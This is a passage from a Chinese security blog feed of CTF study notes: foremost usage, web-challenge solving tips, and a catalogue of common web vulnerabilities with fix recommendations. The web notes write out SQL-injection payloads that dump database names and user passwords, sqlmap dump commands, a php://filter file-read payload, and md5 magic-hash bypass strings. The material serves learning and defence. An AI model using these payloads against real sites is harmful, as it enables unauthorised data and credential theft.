<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;type&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;] </span><br><span class="line">    [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;dir&gt;] [-i &lt;file] </span><br><span class="line"></span><br><span class="line">-V  - 显示版权信息并退出</span><br><span class="line">-t  - 指定文件类型.  (-t jpeg,pdf ...) </span><br><span class="line">-d  -打开间接块检测 (针对UNIX文件系统) </span><br><span class="line">-i  - 指定输入文件 (默认为标准输入) </span><br><span class="line">-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) </span><br><span class="line">-w  - 向磁盘写入审计文件，不写入任何检测到的文件</span><br><span class="line">-o  - 设置输出目录 (默认为为输出)</span><br><span class="line">-c  - 设置配置文件 (默认为 foremost.conf)</span><br><span class="line">-q  - 启用快速模式. 在512字节边界执行搜索.</span><br><span class="line">-Q  - 启用安静模式. 禁用输出消息. </span><br><span class="line">-v  - 详细模式. 向屏幕上记录所有消息。</span><br></pre></td></tr></table></figure>

<p>使用方法就是将图片放进foremost目录下，输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foremost -i xxx.jpg</span><br></pre></td></tr></table></figure>

<p>在目录下会出现一个output文件夹，结果就在里面。</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse刷题</title>
    <url>/2022/01/11/reverse%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e89086db3f7cfac7699b3d161cb5d1416d1f965bac2da352bd691d664d3aca89">0762c98a3f2154e0196399e37952e2d166d11c5a82099fe30258aeebee990a317c64aeeeea91134ef130cdaa5e821ed0654261619ff180a6ab62bcf96811a2f24e6630a1cf4614918d525d8dc6fa463b635c71722e50990809c01ad2336d79d718f765db6b58ecb2000a3d8f54acb53c</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF-wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf之Web</title>
    <url>/2022/01/08/ctf%E4%B9%8Bweb/</url>
    <content><![CDATA[<p>CTF中的Web领域的入门学习</p>
<span id="more"></span>

<h1 id="CTFtools"><a href="#CTFtools" class="headerlink" title="CTFtools"></a>CTFtools</h1><p><a href="http://www.hiencode.com/">CTF在线工具-CTF工具|CTF编码|CTF密码学|CTF加解密|程序员工具|在线编解码 (hiencode.com)</a></p>
<p><a href="https://www.ctftools.com/down/">CTFtools</a>（各种web工具在这里都可以找到）</p>
<h1 id="CTF中Web题的相关解题步骤"><a href="#CTF中Web题的相关解题步骤" class="headerlink" title="CTF中Web题的相关解题步骤"></a>CTF中Web题的相关解题步骤</h1><p>大致都要走以下方法：</p>
<h2 id="1-看源码"><a href="#1-看源码" class="headerlink" title="1. 看源码"></a>1. 看源码</h2><p>右键-&gt;【查看网页源代码】，F12也可以，看网页的源代码，一些签到题或者比较简单的题型都可以直接通过看源代码得到flag，个别题也可以在源代码里得到相关提示。</p>
<h2 id="2-抓包"><a href="#2-抓包" class="headerlink" title="2. 抓包"></a>2. 抓包</h2><p>抓包也是做web常用的方法，而抓包最常用的一般是burpsuite，常用的是【send to Repeater】用于多次尝试，【send to Intruder】用于对某个字段进行爆破，这是比较常用的两种功能。</p>
<h2 id="3-经常关注的几个地方"><a href="#3-经常关注的几个地方" class="headerlink" title="3. 经常关注的几个地方"></a>3. 经常关注的几个地方</h2><p>多刷题后就会发现很多经常需要关注的地方，有时候打开网页后感觉没有可疑的地方，首先查看下源代码，看有没有注释之类的提示信息，之后重新打开网页，抓抓包看下请求包响应包的包头数据有没有可疑的地方。</p>
<h2 id="4-include漏洞"><a href="#4-include漏洞" class="headerlink" title="4. include漏洞"></a>4. include漏洞</h2><p>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php)</span><br></pre></td></tr></table></figure>



<h2 id="5-代码审计"><a href="#5-代码审计" class="headerlink" title="5. 代码审计"></a>5. 代码审计</h2><p>需要多次动态调试来尝试，以及要关注里面出现的函数，出现在关键位置的函数一般都是有用的，搜索一下有没有相关的漏洞。</p>
<p>还有一些和数据处理有关的绕过，如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null，除了遇到时多百度之外，平时也需要多积累到时候才能想到。</p>
<p>还有GET参数构造的时候如果传入的是数组要记得加[]，？txt[]=[1,2,3]，如果填?txt=[1,2,3]似乎不会被当做array处理。</p>
<h2 id="6-编码"><a href="#6-编码" class="headerlink" title="6.编码"></a>6.编码</h2><p>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间。</p>
<p>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：</p>
<p><a href="https://emn178.github.io/online-tools/base64_decode.html">https://emn178.github.io/online-tools/base64_decode.html</a></p>
<p>可以解好多种加密，界面也很简洁。</p>
<h2 id="7-SQL注入"><a href="#7-SQL注入" class="headerlink" title="7.SQL注入"></a>7.SQL注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a&gt;对一个注入语句记个笔记：</span><br><span class="line"> </span><br><span class="line">%df&#x27; union select 1,database() %23 %df&#x27; union select 1,string from sql5.key %23</span><br><span class="line"> </span><br><span class="line">%df是在编码为gbk的时候用于宽字节注入的；%23就是#，但是用#不能通过；还有可以直接用 union select 字段名 from 数据库名.表名 的方式获取字段的值。</span><br><span class="line"> </span><br><span class="line">b&gt;对用sqlmap进行手工注入的一些步骤记个笔记首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。</span><br><span class="line"> </span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump</span><br><span class="line"> </span><br><span class="line">–batch sqlmap不会询问你输入 全部默认确定</span><br><span class="line"> </span><br><span class="line">–level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段</span><br><span class="line"> </span><br><span class="line">–（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。</span><br><span class="line"> </span><br><span class="line">c&gt;还有一些用union select来获得数据库信息的，链接</span><br><span class="line"> </span><br><span class="line">http://www.2cto.com/article/201208/151503.html</span><br><span class="line"> </span><br><span class="line">讲得很全面。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1. @@version() MYSQL版本 </span><br><span class="line">2. @@database() 当前数据库 </span><br><span class="line">3. @@user() 当前用户 </span><br><span class="line">4. @@datadir 当前数据库路径 </span><br><span class="line">5. @@version_compile_os 操作系统版本</span><br><span class="line"> </span><br><span class="line">1. concat(str1,str2,...) 没有分隔符地连接字符串 </span><br><span class="line">2. concat_ws(separator,str1,str2,...) 用分隔符连接字符串 </span><br><span class="line">3. group_concat(str1,str2,...) 用逗号分隔字符串</span><br><span class="line"> </span><br><span class="line">1. 查数据库名，用户名 </span><br><span class="line">union select 1,2,concat(user(),database(),version()),4,……,N -- </span><br><span class="line">（最后--用于注释掉后面sql语句避免出错）得到数据库名 </span><br><span class="line">2. 查表名： union select group_concat(0x0a,table_name),2</span><br><span class="line"> from information_schema.tables </span><br><span class="line">where table_schema=库名十六进制# </span><br><span class="line">（库名十六进制可以用database()代替） </span><br><span class="line">3. 查列名 union select group_concat(0x0a,column_name)</span><br><span class="line">,2 from information_schema.columns </span><br><span class="line">where table_schema=database() and table_name=’users’# （</span><br><span class="line">也可以把表名改为十六进制编码0x7573657273） </span><br><span class="line">4. 查需要的信息（用户名和密码） </span><br><span class="line">union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,</span><br><span class="line">last_name,0x0a,user,0x0a,password,0x0a),</span><br><span class="line">2 from users #</span><br><span class="line"> </span><br><span class="line">总结的都比较散碎也比较基础，以后积累的多了一些之后再来继续补充。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&lt; 用这个表示\u003c   &gt;用这个表示 \u003e </p>
<p>[^]: </p>
<p>序列化学习网址</p>
<p><a href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、当在一个网页上找不到任何信息时，要查看他有没有robots.txt 或者前面的备份文件</span><br><span class="line"> </span><br><span class="line">2、extract() 函数从数组中将变量导入到当前的符号表。通俗的讲 就是可以将键变成变量名，键值可以变成变量名的值</span><br><span class="line"> </span><br><span class="line">sha1（）和md5（）都可以用数组绕过 而md5加密后判断相等时只要是0e字符串都会返回true</span><br><span class="line"> </span><br><span class="line">QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">3、file_get_contents（） 可以使用php://input传过去 再用post构建其里面的内容</span><br><span class="line"> </span><br><span class="line">include() 可以使用</span><br><span class="line"> </span><br><span class="line">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php) 也可以使用上述的方法。</span><br></pre></td></tr></table></figure>

<p>sql md5</p>
<p>看到这里的提交参数被MD5再组合进SQL查询语句，导致常规的注入手段几乎都失效了</p>
<p>但是注意到，MD5之后是hex格式，转化到字符串时如果出现’or’xxxx的形式，就会导致注入</p>
<p>这里提供一个字符串：ffifdyop</p>
<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
<p>转成字符串为’or’6�]��!r,��b</p>
<p>从而完成了注入</p>
<h1 id="Web常见漏洞描述及修复建议"><a href="#Web常见漏洞描述及修复建议" class="headerlink" title="Web常见漏洞描述及修复建议"></a>Web常见漏洞描述及修复建议</h1><h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a></h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Web程序中对于用户提交的参数未做过滤直接拼接到<a href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p>
<p>　　<strong>修复建议</strong></p>
<p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p>
<p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
<p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p>
<p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p>
<p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
<p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
<p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
<p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
<p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p>
<h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p>
<p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p>
<p>XSS攻击可导致以下危害：</p>
<p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p>
<p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p>
<p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p>
<p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p>
<p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
<p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p>
<p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p>
<p>　　<strong>修复建议</strong></p>
<p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p>
<p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p>
<p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p>
<p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
<p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p>
<h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h2><p>　　<strong>漏洞详情</strong></p>
<p>　　参考：<a href="https://www.freebuf.com/company-information/165769.html">https://www.freebuf.com/company-information/165769.html</a></p>
<h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h2><p>　　<strong>漏洞描述****：</strong></p>
<p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p>
<p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p>
<h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>
<p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>
<p>　　(5)、利用File协议读取本地文件。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p>
<p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p>
<p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>　　4、验证请求的文件格式</p>
<p>　　5、禁止跳转</p>
<p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p>
<p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<h2 id="6-任意命令-代码执行"><a href="#6-任意命令-代码执行" class="headerlink" title="6.任意命令/代码执行"></a>6.任意命令/代码执行</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p>
<p>　　2、减少或不使用代码或命令执行函数</p>
<p>　　3、客户端提交的变量在放入函数前进行检测</p>
<p>　　4、减少或不使用危险函数</p>
<h2 id="7-任意文件上传"><a href="#7-任意文件上传" class="headerlink" title="7.任意文件上传"></a>7.任意文件上传</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p>
<p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p>
<p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p>
<p>　　4、严格限制上传的文件路径。</p>
<p>　　5、文件扩展名服务端白名单校验。</p>
<p>　　6、文件内容服务端校验。</p>
<p>　　7、上传文件重命名。</p>
<p>　　8、隐藏上传文件路径。</p>
<h2 id="8-目录穿越-目录遍历"><a href="#8-目录穿越-目录遍历" class="headerlink" title="8.目录穿越/目录遍历"></a>8.目录穿越/目录遍历</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</p>
<h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、严格检查变量是否已经初始化。</p>
<p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</p>
<p>　　3、严格检查文件包含函数中的参数是否外界可控。</p>
<h2 id="10-弱口令"><a href="#10-弱口令" class="headerlink" title="10.弱口令"></a>10.弱口令</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p>
<p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p>
<p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p>
<p>　　3、增加人机验证机制，限制ip访问次数。</p>
<h2 id="11-暴力破解"><a href="#11-暴力破解" class="headerlink" title="11.暴力破解"></a>11.暴力破解</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p>
<p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p>
<p>　　3、增加人机验证机制</p>
<p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p>
<h2 id="12-越权访问"><a href="#12-越权访问" class="headerlink" title="12.越权访问"></a>12.越权访问</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、对用户访问角色的权限进行严格的检查及限制。</p>
<p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制</p>
<h2 id="13-未授权访问"><a href="#13-未授权访问" class="headerlink" title="13.未授权访问"></a>13.未授权访问</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p>
<p>　　2、可以使用session对用户的身份进行判断和控制。</p>
<h2 id="14-列目录"><a href="#14-列目录" class="headerlink" title="14.列目录"></a>14.列目录</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p>
<p>　　2、设置目录访问权限</p>
<h2 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h2><p><strong>漏洞描述</strong></p>
<p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p>
<p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、对传入的对象进行严格的过滤检查</p>
<p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p>
<h2 id="16-http-slow拒绝服务攻击"><a href="#16-http-slow拒绝服务攻击" class="headerlink" title="16.http slow拒绝服务攻击"></a>16.http slow拒绝服务攻击</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p>
<p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p>
<p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p>
<p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</p>
<h2 id="17-CRLF注入"><a href="#17-CRLF注入" class="headerlink" title="17.CRLF注入"></a>17.CRLF注入</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p>
<h2 id="18-LDAP注入"><a href="#18-LDAP注入" class="headerlink" title="18.LDAP注入"></a>18.LDAP注入</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　对用户的输入内容进行严格的过滤。</p>
<h2 id="19-URL-跳转"><a href="#19-URL-跳转" class="headerlink" title="19.URL 跳转"></a>19.URL 跳转</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p>
<p>　　2、白名单规定跳转链接</p>
<h2 id="20-明文传输"><a href="#20-明文传输" class="headerlink" title="20.明文传输"></a>20.明文传输</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p>
<p>　　2、使用https来保证传输的安全。</p>
<h2 id="21-网页木马"><a href="#21-网页木马" class="headerlink" title="21.网页木马"></a>21.网页木马</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p>
<p>　　2、发现并及时修复已存在的漏洞。</p>
<p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p>
<h2 id="22-备份文件泄露"><a href="#22-备份文件泄露" class="headerlink" title="22.备份文件泄露"></a>22.备份文件泄露</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p>
<p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p>
<h2 id="23-敏感信息泄露"><a href="#23-敏感信息泄露" class="headerlink" title="23.敏感信息泄露"></a>23.敏感信息泄露</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p>
<p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p>
